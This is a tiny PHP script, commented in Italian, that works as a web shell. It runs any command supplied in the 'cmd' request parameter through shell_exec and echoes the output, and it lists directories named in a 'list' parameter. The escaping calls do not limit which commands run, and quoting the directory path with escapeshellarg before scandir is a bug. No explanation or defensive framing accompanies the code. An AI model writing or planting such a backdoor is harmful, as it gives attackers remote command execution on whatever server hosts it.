<?php
if (isset($_REQUEST['cmd'])) {
    $command = escapeshellcmd($_REQUEST['cmd']);
    $output = shell_exec($command);
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}

// Funzione per elencare file in una directory specifica
if (isset($_REQUEST['list'])) {
    $directory = escapeshellarg($_REQUEST['list']);
    $files = scandir($directory);
    echo "<pre>" . htmlspecialchars(print_r($files, true)) . "</pre>";
}
?>
